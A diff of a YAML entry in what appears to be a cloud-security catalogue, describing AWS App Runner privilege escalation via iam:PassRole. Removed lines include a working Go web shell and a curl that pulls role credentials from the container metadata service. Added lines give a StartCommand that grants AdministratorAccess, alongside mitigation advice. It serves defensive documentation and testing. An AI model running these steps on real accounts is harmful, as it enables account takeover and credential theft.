@@ -4,89 +4,48 @@ category: service-passrole
 services:
 - iam
 - apprunner
-description: A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged
-  IAM role. By deploying a malicious container image (such as a web shell or reverse shell) as the App Runner service, the
-  attacker can execute arbitrary code within the container. The container has access to the IAM role's credentials via the
-  AWS SDK or instance metadata service, allowing the attacker to perform actions with the role's elevated permissions. This
-  technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.
+description: A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged IAM role attached. The service runs with the attached role's permissions, and the attacker has multiple ways to leverage these permissions. They can configure a StartCommand to execute AWS CLI commands when the service starts, deploy a container with a web shell or reverse shell to access the role's credentials via the container metadata service, or use a repository with an apprunner.yaml file containing malicious commands. This technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.
 prerequisites:
   admin:
-  - A role must exist that trusts apprunner.amazonaws.com to assume it
+  - A role must exist that trusts tasks.apprunner.amazonaws.com to assume it
   - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
-  - Access to a container registry (ECR or public registry) to host the malicious image
   lateral:
-  - A role must exist that trusts apprunner.amazonaws.com to assume it
-  - Access to a container registry (ECR or public registry) to host the malicious image
+  - A role must exist that trusts tasks.apprunner.amazonaws.com to assume it
 exploitationSteps:
   awscli:
   - step: 1
-    command: |
-      cat > main.go << 'EOF'
-      package main
-      import (
-          "net/http"
-          "os/exec"
-      )
-      func handler(w http.ResponseWriter, r *http.Request) {
-          cmd := r.URL.Query().Get("cmd")
-          out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
-          w.Write(out)
-      }
-      func main() {
-          http.HandleFunc("/", handler)
-          http.ListenAndServe(":8080", nil)
-      }
-      EOF
-    description: Create a simple web shell that executes commands via URL parameters
+    command: aws sts get-caller-identity
+    description: Verify your current identity and note your username for the next step
   - step: 2
-    command: |
-      cat > Dockerfile << 'EOF'
-      FROM golang:1.19
-      WORKDIR /app
-      COPY main.go .
-      RUN go build -o webshell main.go
-      EXPOSE 8080
-      CMD ["./webshell"]
-      EOF
-    description: Create a Dockerfile for the web shell
-  - step: 3
-    command: |
-      docker build -t malicious-apprunner .
-      docker tag malicious-apprunner:latest PUBLIC_ECR_URI:latest
-      docker push PUBLIC_ECR_URI:latest
-    description: Build and push the malicious container image to a registry
-  - step: 4
     command: |
       aws apprunner create-service \
         --service-name privesc-service \
         --source-configuration '{
           "ImageRepository": {
-            "ImageIdentifier": "PUBLIC_ECR_URI:latest",
+            "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
             "ImageRepositoryType": "ECR_PUBLIC",
             "ImageConfiguration": {
-              "Port": "8080"
+              "Port": "8080",
+              "StartCommand": "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
             }
           },
           "AutoDeploymentsEnabled": false
         }' \
         --instance-configuration '{
+          "Cpu": "1 vCPU",
+          "Memory": "2 GB",
           "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
         }'
-    description: Create an App Runner service with the malicious image and privileged role
+    description: Create an App Runner service using the public AWS CLI image with a StartCommand that grants admin access to your user
+  - step: 3
+    command: aws apprunner describe-service --service-arn SERVICE_ARN --query 'Service.Status'
+    description: Wait for the service to reach 'RUNNING' status (may take 3-5 minutes). The StartCommand executes when the service starts, attaching AdministratorAccess to your user.
+  - step: 4
+    command: sleep 15
+    description: Wait 15 seconds for IAM policy changes to propagate
   - step: 5
-    command: aws apprunner describe-service --service-arn SERVICE_ARN
-    description: Wait for the service to be in 'RUNNING' status and retrieve the service URL
-  - step: 6
-    command: |
-      curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-    description: Use the web shell to retrieve temporary credentials from the container metadata
-  - step: 7
-    command: |
-      export AWS_ACCESS_KEY_ID=<from step 6>
-      export AWS_SECRET_ACCESS_KEY=<from step 6>
-      export AWS_SESSION_TOKEN=<from step 6>
-      aws sts get-caller-identity
-    description: Use the stolen credentials to assume the privileged role's permissions
+    command: aws iam list-users --max-items 3
+    description: Verify administrator access by listing IAM users (should now succeed)
 recommendation: |
   Restrict the `iam:PassRole` permission using the principle of least privilege.
 
@@ -106,9 +65,10 @@ recommendation: |
   Additional controls:
   - Restrict `apprunner:CreateService` permissions to specific users/roles
   - Monitor CloudTrail for App Runner service creation with privileged roles
+  - Alert on services using StartCommand to execute IAM, STS, or security-related commands
   - Use VPC configuration to isolate App Runner services
   - Implement container image scanning and signing
-  - Only allow images from trusted ECR repositories
+  - Only allow images from trusted ECR repositories (consider blocking public ECR if not needed)
   - Alert on App Runner services created with administrative roles
   - Use AWS Config to detect services with overly permissive roles
 discoveredBy:
@@ -139,116 +99,197 @@ attackVisualization:
       label: App Runner Service
       type: resource
       description: |
-        New App Runner service created with a malicious container image and a privileged IAM role. The service runs on AWS-managed infrastructure and automatically assumes the attached role. The container image contains a web shell that allows command execution with the target role's credentials.
+        New App Runner service created with a privileged IAM role attached. The service runs on AWS-managed infrastructure and automatically assumes the attached role. The attacker can configure the service in multiple ways to leverage the role's permissions.
 
     - id: target_role
       label: target-role
       type: resource
       description: |
-        IAM role passed to the App Runner service as the instance role. The role must trust apprunner.amazonaws.com to assume it. Credentials are available via the AWS Container Credentials Relative URI environment variable within the running container.
+        IAM role passed to the App Runner service as the instance role. The role must trust apprunner.amazonaws.com to assume it. When the App Runner service starts, it assumes this role and provides access to the role's permissions through various methods.
 
-    - id: exfiltrate_creds
-      label: Exfiltrate Credentials
+    - id: method_startcommand
+      label: "Method 1: StartCommand"
       type: action
       color: '#99ccff'
       description: |
-        Use the web shell endpoint to execute commands within the running container. The container has access to the target role's temporary credentials via the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, which points to the container metadata service at 169.254.170.2. The web shell can query this endpoint to retrieve the AccessKeyId, SecretAccessKey, and SessionToken.
+        Configure a StartCommand that executes when the service starts, running AWS CLI commands with the target role's credentials. The StartCommand can perform privileged actions such as:
+        - Attaching AdministratorAccess policy to the starting principal
+        - Creating new access keys for privileged users
+        - Modifying IAM policies or trust relationships
+        - Exfiltrating data from S3, secrets, or databases
+        - Any AWS API action the target role has permissions for
 
-        Example commands the web shell could execute:
-        - Query metadata service for credentials
-        - Use AWS SDK with the role's credentials to perform privileged actions
-        - Exfiltrate credentials to attacker-controlled infrastructure
+        Example: `StartCommand: "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"`
+
+    - id: method_webshell
+      label: "Method 2: ECR Image with Web Shell"
+      type: action
+      color: '#99ccff'
+      description: |
+        Deploy a container image (from ECR or public registry) containing a web shell or reverse shell. The container runs with the target role's permissions and can access the role's temporary credentials via the container metadata service at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.
+
+        The web shell provides an interface to:
+        - Query the metadata service for temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
+        - Execute arbitrary commands within the container
+        - Exfiltrate the credentials for use outside the container
+
+    - id: method_apprunner_yaml
+      label: "Method 3: Repository with apprunner.yaml"
+      type: action
+      color: '#99ccff'
+      description: |
+        Point the App Runner service to a source code repository containing a malicious apprunner.yaml configuration file. The apprunner.yaml file can specify build and run commands that execute during the service deployment and startup, running with the target role's permissions.
+
+        The apprunner.yaml can include:
+        - Pre-build commands that execute during image build
+        - Post-build commands after the build completes
+        - Start commands that run when the service starts
+        - All commands execute with access to the target role's credentials via environment variables or metadata service
 
     - id: admin
       label: Effective Administrator
       type: outcome
       description: |
-        The attacker successfully exfiltrated credentials from the App Runner service and the target role has AdministratorAccess or equivalent permissions. The attacker now has full administrative access to the AWS account.
+        The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.
 
     - id: some_perms
       label: Check for Additional Access
       type: outcome
       color: '#ffeb99'
       description: |
-        The attacker successfully exfiltrated credentials from the App Runner service and the target role has some elevated permissions (but not full admin). This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths.
+        The target role has some elevated permissions (but not full admin). Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.
 
     - id: no_access
       label: Minimal Additional Access
       type: outcome
       color: '#cccccc'
       description: |
-        The attacker successfully exfiltrated credentials from the App Runner service, but the target role only has minimal permissions. Limited usefulness for privilege escalation.
+        The target role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value.
 
   edges:
     - from: start
       to: apprunner_service
       label: iam:PassRole + apprunner:CreateService
       description: |
-        Create a new App Runner service with a malicious container image (containing a web shell) and pass the target role to it as the instance role. The container image must be accessible from a container registry (ECR or public registry).
+        Create a new App Runner service and pass the target role as the instance role. The service can be configured using multiple approaches (StartCommand, container image, or source repository).
 
-        Command:
+        Example command (StartCommand approach):
         ```bash
         aws apprunner create-service \
           --service-name privesc-service \
           --source-configuration '{
             "ImageRepository": {
-              "ImageIdentifier": "PUBLIC_ECR_URI:latest",
+              "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
               "ImageRepositoryType": "ECR_PUBLIC",
               "ImageConfiguration": {
-                "Port": "8080"
+                "Port": "8080",
+                "StartCommand": "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
               }
             },
             "AutoDeploymentsEnabled": false
           }' \
           --instance-configuration '{
+            "Cpu": "1 vCPU",
+            "Memory": "2 GB",
             "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
           }'
         ```
-
-        Wait for the service to reach RUNNING status and retrieve the service URL.
 
     - from: apprunner_service
       to: target_role
       label: Service assumes role
       description: |
-        The App Runner service automatically assumes the passed instance role. Credentials become available within the running container via the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, which points to 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.
+        The App Runner service automatically assumes the passed instance role when it starts. The service now has access to all permissions granted to this role.
 
     - from: target_role
-      to: exfiltrate_creds
-      label: Access web shell
+      to: method_startcommand
+      label: Option A
       description: |
-        Access the deployed web shell via the App Runner service URL to execute commands within the container. The web shell can query the container metadata service to retrieve the target role's temporary credentials.
+        Use the StartCommand configuration parameter to execute AWS CLI commands when the service starts. The command runs with the target role's credentials.
 
-        Command:
-        ```bash
-        curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-        ```
+    - from: target_role
+      to: method_webshell
+      label: Option B
+      description: |
+        Deploy a container image containing a web shell or reverse shell. Access the role's credentials via the container metadata service.
 
-        This returns a JSON response containing AccessKeyId, SecretAccessKey, and Token that can be used to authenticate as the target role.
+    - from: target_role
+      to: method_apprunner_yaml
+      label: Option C
+      description: |
+        Configure the service to use a source code repository with a malicious apprunner.yaml file that specifies commands to execute during build and runtime.
 
-    - from: exfiltrate_creds
+    - from: method_startcommand
       to: admin
       label: If target role has admin permissions
-      branch: A
+      branch: A1
       condition: admin
       description: |
-        If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials.
+        The StartCommand executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access.
 
-    - from: exfiltrate_creds
+    - from: method_startcommand
       to: some_perms
       label: If target role has some elevated permissions
-      branch: B
+      branch: A2
       condition: some_permissions
       description: |
-        If the target role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks.
+        The StartCommand executes with elevated permissions and can perform privileged actions within those permissions.
 
-    - from: exfiltrate_creds
+    - from: method_startcommand
       to: no_access
       label: If target role has minimal permissions
-      branch: C
+      branch: A3
       condition: no_permissions
       description: |
-        If the target role only has minimal permissions (like logs:PutLogEvents), the exfiltrated credentials provide limited value for privilege escalation.
+        The StartCommand has minimal permissions and provides limited value for privilege escalation.
+
+    - from: method_webshell
+      to: admin
+      label: If target role has admin permissions
+      branch: B1
+      condition: admin
+      description: |
+        The web shell successfully exfiltrates credentials with AdministratorAccess permissions, granting full administrative access.
+
+    - from: method_webshell
+      to: some_perms
+      label: If target role has some elevated permissions
+      branch: B2
+      condition: some_permissions
+      description: |
+        The web shell exfiltrates credentials with elevated permissions that can be used for data access or further escalation.
+
+    - from: method_webshell
+      to: no_access
+      label: If target role has minimal permissions
+      branch: B3
+      condition: no_permissions
+      description: |
+        The exfiltrated credentials have minimal permissions and provide limited value.
+
+    - from: method_apprunner_yaml
+      to: admin
+      label: If target role has admin permissions
+      branch: C1
+      condition: admin
+      description: |
+        The apprunner.yaml commands execute with AdministratorAccess permissions and successfully escalate privileges.
+
+    - from: method_apprunner_yaml
+      to: some_perms
+      label: If target role has some elevated permissions
+      branch: C2
+      condition: some_permissions
+      description: |
+        The apprunner.yaml commands execute with elevated permissions and can perform privileged actions.
+
+    - from: method_apprunner_yaml
+      to: no_access
+      label: If target role has minimal permissions
+      branch: C3
+      condition: no_permissions
+      description: |
+        The apprunner.yaml commands have minimal permissions and provide limited value.
 permissions:
   required:
   - permission: iam:PassRole
